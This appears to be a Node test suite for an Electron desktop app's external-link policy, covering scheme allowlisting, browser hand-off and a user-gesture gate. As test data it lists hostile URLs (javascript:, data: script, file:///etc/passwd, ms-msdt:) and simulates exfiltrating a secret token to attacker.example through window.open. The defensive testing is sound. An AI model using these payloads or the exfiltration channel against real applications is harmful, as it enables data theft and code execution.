// #3031 — "clicking links across the app does not open them in the browser", pinned.
//
// Two gates were each refusing ordinary links and NEITHER logged loudly enough to be noticed:
//
//   1. `ui-bridge.js › dopl:open-external` ran a HOST allowlist (stripe.com, github.com, the
//      app origin). Every other destination answered `{ ok: false }`, which
//      `src/shared/lib/open-external.ts` discards — a clicked link was a silent no-op.
//   2. `spa-window.js › policeNavigation` refused the navigation and stopped: `window.open`
//      denied, `will-navigate` preventDefault'd, no hand-off. A plain `<a href>` or
//      `<a target="_blank">` never reached the bridge at all.
//
// This file pins the policy (`main/external-url.js`, sliced and driven directly) and the WIRING
// of both call sites, because the bug was never in the predicate — it was in what the two
// surfaces did with its answer.
//
// Run: `node --test dopl-desktop-app/test/external-url.test.mjs`

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { MAIN, real } from "./helpers/module-sandbox.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const M = (p) => readFileSync(join(HERE, "..", "main", p), "utf8");
// The WEB tree's copy of the same allow-list (see the parity test at the bottom).
const WEB = (...p) => readFileSync(join(HERE, "..", "..", "src", ...p), "utf8");

function slice(src, name) {
  const BEGIN = `// ─── BEGIN ${name}`;
  const END = `// ─── END ${name}`;
  const from = src.indexOf(BEGIN);
  const to = src.indexOf(END);
  assert.notEqual(from, -1, `BEGIN ${name} sentinel missing`);
  assert.ok(to > from, `${name} sentinels out of order`);
  return src.slice(from, to);
}

const EXTERNAL = M("external-url.js");
const { isOpenableExternalUrl, externalUrlHost, OPENABLE_SCHEMES } = new Function(
  `${slice(EXTERNAL, "EXTERNAL-URL-PURE")}; return { isOpenableExternalUrl, externalUrlHost, OPENABLE_SCHEMES };`
)();

// ── THE POLICY ───────────────────────────────────────────────────────────────

test("an ordinary link to ANY host opens — that is the whole bug", () => {
  for (const ok of [
    "https://example.com/",
    "https://news.ycombinator.com/item?id=1",
    "http://example.com/plain-http",
    "https://docs.anthropic.com/en/docs#section",
    "https://user.github.io/repo/",
    "https://example.com/path?q=a%20b&r=2",
    "https://xn--bcher-kva.example/", // punycode host
    "https://example.com:8443/x", // non-default port
    "mailto:someone@example.com",
    "mailto:someone@example.com?subject=Hi",
  ]) {
    assert.equal(isOpenableExternalUrl(ok), true, `refused a real link: ${ok}`);
  }
});

test("the bound is the SCHEME: no local-file, code-execution or inline-data target", () => {
  for (const evil of [
    "file:///etc/passwd",
    "file://host/share/x",
    "smb://host/share",
    "javascript:alert(1)",
    "JavaScript:alert(1)", // the constructor lower-cases the scheme
    "  javascript:alert(1)", // …and strips leading whitespace, so prefix tests are not enough
    "\njavascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<script>alert(1)</script>",
    "blob:https://example.com/abc",
    "about:blank",
    "chrome://settings",
    "ftp://host/f",
    "ms-msdt:/id",
    "not a url",
    "",
    "   ",
  ]) {
    assert.equal(isOpenableExternalUrl(evil), false, `admitted: ${evil}`);
  }
});

test("a non-string is refused, never coerced", () => {
  for (const bad of [null, undefined, 0, 1, {}, [], ["https://example.com"], true]) {
    assert.equal(isOpenableExternalUrl(bad), false, `admitted: ${JSON.stringify(String(bad))}`);
  }
});

test("a file-shaped path under a web scheme is NORMALIZED to a web host, not a local read", () => {
  // ⚠ CHECKED, NOT ASSUMED. The guard was written expecting `http:///etc/passwd` to parse with
  // an empty host and the local pathname — it does not. WHATWG treats http/https as SPECIAL
  // schemes and requires an authority, so the parser consumes the first path segment AS the
  // host: `http:///etc/passwd` → host "etc", path "/passwd". That is an ordinary (unresolvable)
  // web URL, so admitting it is correct and reads nothing off the disk.
  const u = new URL("http:///etc/passwd");
  assert.equal(u.hostname, "etc");
  assert.equal(u.pathname, "/passwd");
  assert.equal(isOpenableExternalUrl("http:///etc/passwd"), true);
  // …and a hostless http(s) URL cannot be constructed at all, which is the other half of why
  // a local path can never arrive wearing a web scheme.
  assert.throws(() => new URL("https://"));
  assert.equal(isOpenableExternalUrl("https://"), false);
  // The empty-host branch therefore guards an unreachable shape TODAY and is kept deliberately:
  // it is what stops a non-special scheme added to the list later from carrying a bare path.
  assert.match(EXTERNAL, /return !!u\.hostname;/);
});

test("the openable set is exactly http, https, mailto — adding one is a deliberate edit", () => {
  assert.deepEqual([...OPENABLE_SCHEMES].sort(), ["http:", "https:", "mailto:"]);
  assert.ok(Object.isFrozen(OPENABLE_SCHEMES), "the list must not be mutable at runtime");
});

test("externalUrlHost gives a host and never the query string", () => {
  assert.equal(externalUrlHost("https://example.com/p?token=secret"), "example.com");
  assert.equal(externalUrlHost("https://example.com:8443/x"), "example.com:8443");
  assert.equal(externalUrlHost("not a url"), "?");
  assert.equal(externalUrlHost(null), "?");
  assert.ok(!externalUrlHost("https://example.com/?t=secret").includes("secret"));
});

// ── CALL SITE 1: the bridge handler asks, and opens on a yes ────────────────

test("dopl:open-external opens whatever the policy admits", () => {
  const BRIDGE = M("ui-bridge.js");
  const fn = BRIDGE.slice(
    BRIDGE.indexOf("'dopl:open-external'"),
    BRIDGE.indexOf("broadcastAuthState")
  );
  assert.match(fn, /externalUrl\.isOpenableExternalUrl\(url\)/);
  assert.match(fn, /shell\.openExternal\(/, "a yes must actually reach the OS opener");
  // ⚠ Match the DECLARATION, not the name: both names survive in the comments that record why
  // they went, and a bare name test fails on its own tombstone.
  assert.ok(
    !/EXTERNAL_HOST_ALLOWLIST\s*=/.test(BRIDGE),
    "the host allowlist must not be redeclared in the bridge"
  );
  assert.ok(
    !/function isAllowedExternalUrl/.test(BRIDGE),
    "nor its predicate"
  );
});

// ── CALL SITE 2: the window hands off what it refuses to navigate ───────────

test("a DENIED window.open still hands its URL to the real browser", () => {
  const SPA = M("spa-window.js");
  const handler = SPA.slice(
    SPA.indexOf("setWindowOpenHandler"),
    SPA.indexOf("const indexHref")
  );
  assert.match(handler, /handOffExternal\(/, "target=_blank / window.open must hand off");
  assert.match(handler, /action: 'deny'/, "…and the in-app window must still be denied");
});

test("a REFUSED top-frame navigation hands off instead of being swallowed", () => {
  const SPA = M("spa-window.js");
  const police = SPA.slice(
    SPA.indexOf("const police = (event, url)"),
    SPA.indexOf("win.webContents.on('will-navigate'")
  );
  assert.match(police, /event\.preventDefault\(\)/, "the top frame still may not leave");
  assert.match(police, /handOffExternal\(url/, "and the URL goes to the browser");
  // The predicate itself did not loosen — this is the same gate, with an else-branch.
  assert.match(police, /isAllowedNavigation\(url, devUrl\(\), indexHref\)/);
});

test("will-frame-navigate refuses WITHOUT handing off, so one click is not two tabs", () => {
  // Electron fires BOTH will-navigate and will-frame-navigate for one main-frame navigation.
  const SPA = M("spa-window.js");
  const frame = SPA.slice(
    SPA.indexOf("win.webContents.on('will-frame-navigate'"),
    SPA.indexOf("return win;")
  );
  assert.ok(!/handOffExternal/.test(frame), "a second hand-off would open the link twice");
  assert.match(frame, /if \(!event\.isMainFrame\) \{ event\.preventDefault\(\); return; \}/);
});

test("the hand-off asks the SHARED policy and cannot reject into an event handler", () => {
  const SPA = M("spa-window.js");
  const fn = SPA.slice(
    SPA.indexOf("function handOffExternal"),
    SPA.indexOf("// Deny every `window.open`")
  );
  assert.match(fn, /externalUrl\.isOpenableExternalUrl\(url\)/, "one policy, not a second copy");
  assert.match(fn, /\.catch\(/, "a failed OS opener must not surface as an unhandled rejection");
  assert.match(fn, /externalUrlHost\(url\)/, "a refused URL is logged by host only");
  // ⚠ The URL must never be a diag ARGUMENT. Matching a bare `url)` hits `externalUrlHost(url)`
  // — the very call that makes this safe — so pin the argument position instead.
  assert.ok(!/diag\([^)]*,\s*url\s*[),]/.test(fn), "never pass the URL itself to diag");
  assert.ok(!/diag\(\s*url\b/.test(fn), "nor as its first argument");
});

// ── CALL SITE 2, DRIVEN: spa-window.js over a stubbed shell ─────────────────
//
// ⚠ EVERY ASSERTION ABOVE ABOUT `handOffExternal` IS A REGEX ON SOURCE (release review
// 2026-10-11). Nothing loaded the module, so replacing `shell.openExternal(String(url).trim())`
// with a constant, a no-op, or an UNCONDITIONAL open kept the whole suite green. These cases
// load the shipped source over stubs and read what the OS opener actually received.

/**
 * spa-window.js with electron faked; `opened` is every URL that reached `shell.openExternal`.
 *
 * ⚠ ITS OWN LOADER, not `loadWithStubs`: this module resolves the bundled index off `__dirname`
 * at require time, and the shared sandbox supplies only (require, module, exports). Everything
 * else is the same contract — an unlisted require throws, so a new dependency is faked on purpose.
 */
function bootSpa() {
  const opened = [];
  const lines = [];
  const stubs = {
    path: real("path"),
    "node:url": real("node:url"),
    electron: {
      app: { getLoginItemSettings: () => ({ wasOpenedAsHidden: false }) },
      BrowserWindow: class {},
      shell: { openExternal: async (u) => { opened.push(u); } },
    },
    "./external-url": real("./external-url"),
    "./config": { APP_ORIGIN: "https://app.example" },
    "./diag": { diag: (...parts) => lines.push(parts.join(" ")) },
  };
  const src = readFileSync(join(MAIN, "spa-window.js"), "utf8");
  const mod = { exports: {} };
  new Function("require", "module", "exports", "__dirname", src)(
    (id) => {
      if (Object.hasOwn(stubs, id)) return stubs[id];
      throw new Error(`unexpected require: ${id}`);
    },
    mod,
    mod.exports,
    MAIN
  );
  return { mod: mod.exports, opened, lines };
}

/** A BrowserWindow stand-in that records the handlers `policeNavigation` installs. */
function fakeWin() {
  const on = new Map();
  let openHandler = null;
  const webContents = {
    on: (event, fn) => { if (!on.has(event)) on.set(event, []); on.get(event).push(fn); },
    setWindowOpenHandler: (fn) => { openHandler = fn; },
  };
  return {
    webContents,
    emit: (event, ...args) => (on.get(event) || []).forEach((fn) => fn(...args)),
    windowOpen: (url) => openHandler({ url }),
    /** A real click/keypress in this window, as Electron reports it to main. */
    gesture: (type = "mouseDown") => {
      const armed = on.get("input-event") || [];
      assert.ok(armed.length > 0, "policeNavigation must arm input tracking");
      armed.forEach((fn) => fn({}, { type }));
    },
  };
}

// `handOffExternal` opens from a `.then()`, so let the microtasks run before reading `opened`.
const settle = () => new Promise((r) => setImmediate(r));

test("a SCRIPTED window.open never reaches the OS opener — no gesture, no open", async () => {
  // ⚠ THE FINDING, measured. Before the gesture gate this handed EVERY url to
  // `shell.openExternal` with only a scheme bound, which is an outbound channel out of a
  // `connect-src 'none'` document: `window.open('https://attacker/?' + secrets)`.
  const { mod, opened, lines } = bootSpa();
  const win = fakeWin();
  mod.policeNavigation(win);
  const result = win.windowOpen("https://attacker.example/?exfil=secret-token");
  await settle();
  assert.deepEqual(result, { action: "deny" }, "the in-app window is still denied");
  assert.deepEqual(opened, [], "and nothing was opened: no person asked for it");
  assert.match(lines.at(-1), /no user gesture/);
  assert.ok(!lines.join("|").includes("secret-token"), "the refused URL is logged by host only");
});

test("a CLICKED window.open hands the exact URL over", async () => {
  // The other half: the #3031 fix still works. A real click, then the open it authorizes.
  const { mod, opened } = bootSpa();
  const win = fakeWin();
  mod.policeNavigation(win);
  win.gesture("mouseDown");
  assert.deepEqual(win.windowOpen("https://example.com/a?b=c"), { action: "deny" });
  await settle();
  assert.deepEqual(opened, ["https://example.com/a?b=c"], "verbatim, and exactly once");
});

test("a REFUSED navigation hands off on a yes and opens NOTHING on a file: no", async () => {
  const { mod, opened, lines } = bootSpa();
  const win = fakeWin();
  mod.policeNavigation(win);
  win.gesture("keyDown");
  // A link the top frame may not navigate to: prevented, then handed to the browser.
  let prevented = 0;
  win.emit("will-navigate", { preventDefault: () => { prevented += 1; } }, "https://example.com/x");
  await settle();
  assert.equal(prevented, 1, "the top frame still may not leave the bundle");
  assert.deepEqual(opened, ["https://example.com/x"]);
  // …and the `file:` no is a no even WITH a gesture: the scheme gate is the second question.
  win.gesture("mouseUp");
  win.emit("will-navigate", { preventDefault: () => { prevented += 1; } }, "file:///etc/passwd");
  await settle();
  assert.equal(prevented, 2);
  assert.deepEqual(opened, ["https://example.com/x"], "a local-file target never opens");
  assert.match(lines.at(-1), /not openable/);
});

test("the hand-off refuses outright when no window is named", async () => {
  // Fails CLOSED: a caller that cannot say which window acted cannot prove a person did.
  const { mod, opened } = bootSpa();
  assert.equal(mod.handOffExternal("https://example.com/", "direct", null), false);
  assert.equal(mod.handOffExternal("https://example.com/", "direct", undefined), false);
  await settle();
  assert.deepEqual(opened, []);
});

test("the gesture window is Chromium's 5s, and only ACTIVATION counts", () => {
  const { mod } = bootSpa();
  assert.equal(mod.GESTURE_WINDOW_MS, 5000);
  for (const yes of ["mouseDown", "mouseUp", "keyDown", "rawKeyDown", "keyUp", "char", "touchStart", "touchEnd", "gestureTap"]) {
    assert.equal(mod.isActivatingInput(yes), true, `${yes} is a person acting`);
  }
  // Moving a pointer across a transcript, or scrolling it, is not consent to open a browser.
  for (const no of ["mouseMove", "mouseEnter", "mouseLeave", "mouseWheel", "gestureScrollBegin", "gestureScrollUpdate", "undefined", "", null, undefined, {}]) {
    assert.equal(mod.isActivatingInput(no), false, `admitted: ${String(no)}`);
  }
  // Freshness: never-seen, expired and clock-stepped are all refusals.
  assert.equal(mod.gestureIsFresh(1000, 1000), true);
  assert.equal(mod.gestureIsFresh(1000, 6000), true, "exactly at the boundary");
  assert.equal(mod.gestureIsFresh(1000, 6001), false, "one ms past it");
  assert.equal(mod.gestureIsFresh(undefined, 6000), false, "a window nobody ever clicked");
  assert.equal(mod.gestureIsFresh(5000, 1000), false, "a gesture from the future is not one");
  for (const bad of [NaN, Infinity, null, "1000"]) {
    assert.equal(mod.gestureIsFresh(bad, 1000), false, `admitted: ${String(bad)}`);
  }
});

test("an EXPIRED gesture stops authorizing opens", async () => {
  // The same wiring, with the recorded gesture aged past the window by hand (the tracker stamps
  // Date.now(), so this is the only part a stub cannot reach without mocking the clock).
  const { mod, opened } = bootSpa();
  const win = fakeWin();
  mod.policeNavigation(win);
  win.gesture("mouseDown");
  assert.equal(mod.hasRecentUserGesture(win.webContents), true);
  const realNow = Date.now;
  try {
    Date.now = () => realNow() + mod.GESTURE_WINDOW_MS + 1;
    assert.equal(mod.hasRecentUserGesture(win.webContents), false);
    win.windowOpen("https://example.com/stale");
    await settle();
    assert.deepEqual(opened, [], "a click five seconds ago authorizes nothing now");
  } finally {
    Date.now = realNow;
  }
});

test("the window-open handler asks the gesture gate, in source as well as in behaviour", () => {
  const SPA = M("spa-window.js");
  const handler = SPA.slice(
    SPA.indexOf("setWindowOpenHandler"),
    SPA.indexOf("const indexHref")
  );
  assert.match(handler, /handOffExternal\(details && details\.url, 'window\.open', win\.webContents\)/,
    "the handler must name the window, or the hand-off cannot ask about a gesture");
  assert.match(fnOfSpa("policeNavigation"), /armGestureTracking\(win\.webContents\)/,
    "and the window that gets the hand-off must also get the gesture source");
});

function fnOfSpa(name) {
  const SPA = M("spa-window.js");
  const at = SPA.indexOf(`function ${name}(`);
  assert.notEqual(at, -1, `function ${name} not found`);
  return SPA.slice(at, SPA.indexOf("\n}", at));
}

test("both surfaces require the ONE module, neither re-implements it", () => {
  for (const f of ["ui-bridge.js", "spa-window.js"]) {
    assert.match(M(f), /require\('\.\/external-url'\)/, `${f} must share the policy`);
  }
  // No third copy of a scheme test anywhere in main.
  assert.ok(
    !/function isExternalUrl/.test(M("ui-bridge.js") + M("spa-window.js")),
    "a second scheme predicate is how the OS opener comes to have two policies"
  );
});

// ── CROSS-TREE PARITY: the web renderer holds the SAME allow-list ───────────
//
// ⚠ THE "ONE POLICY" RULE STOPPED AT `main/` (release review 2026-10-11). The assertion above
// pins that nothing in the desktop main process re-implements the scheme test — but
// `src/features/channels/components/message-markdown-links.tsx › SAFE_PROTOCOLS` is a SECOND,
// independent copy of the same list, and until this case there was nothing comparing them. The
// two halves do different jobs on one click: the web set decides whether an ANCHOR RENDERS AT
// ALL, and `OPENABLE_SCHEMES` decides whether the main process will OPEN it. Drift is therefore
// silent in both directions:
//   • a scheme added only to the web set renders a link that no-ops when clicked (#3031 again);
//   • a scheme added only here is openable by a link the transcript refuses to draw.
// So this is a DRIFT GATE, not a style check: adding a scheme has to be one deliberate edit in
// two places, and this case is the thing that says so.
//
// ⚠ READ, NOT IMPORTED, deliberately. The web file is a TSX client component that re-exports
// `@/shared/ui/external-anchor` — importing it under `node --test` would pull the React tree
// and the `@/` alias into a main-process suite. The set is a frozen literal, so the honest
// reading is the literal. (A clean cross-tree IMPORT is possible and is proposed in the
// handover report rather than done here: the web file is not this agent's to edit.)
test("the web transcript's SAFE_PROTOCOLS and OPENABLE_SCHEMES are the SAME set", () => {
  const src = WEB("features", "channels", "components", "message-markdown-links.tsx");
  const m = /const SAFE_PROTOCOLS\s*=\s*new Set\(\s*\[([^\]]*)\]\s*\)/.exec(src);
  assert.ok(m, "SAFE_PROTOCOLS literal not found — if it moved, this gate must follow it");
  const web = m[1]
    .split(",")
    .map((s) => s.trim().replace(/^["'`]|["'`]$/g, ""))
    .filter(Boolean);
  assert.ok(web.length > 0, "an empty parse would make this gate vacuous");
  assert.deepEqual(
    [...web].sort(),
    [...OPENABLE_SCHEMES].sort(),
    "the renderer's link allow-list and the OS opener's must be one decision"
  );
});
